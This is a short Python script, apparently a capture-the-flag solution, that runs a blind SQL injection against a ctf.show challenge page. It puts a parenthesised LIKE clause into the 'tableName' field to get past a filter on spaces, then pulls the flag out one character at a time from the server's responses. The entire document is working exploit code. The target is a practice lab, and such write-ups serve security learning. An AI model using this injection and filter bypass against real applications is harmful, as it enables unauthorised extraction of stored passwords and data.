# -- coding:UTF-8 --
# Author:孤桜懶契
# Date:2021/4/8 21:24
# blog: gylq.gitee.io
import requests

url = "http://0a180e9f-3b1b-49fa-a79b-efc32209cccb.challenge.ctf.show/select-waf.php"
str = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = "ctfshow"
for i in range(0, 666):
    print(' 开始盲注第{}位'.format(i))
    for j in str:
        data = {
            "tableName": "(ctfshow_user)where(pass)like'{0}%'".format(flag + j)
        }
        res = requests.post(url, data)
        if res.text.find("$user_count = 1") > 0:
            flag += j
            print(flag)
            if j == "}":
                print(' flag is {}'.format(flag))
                exit()
            break
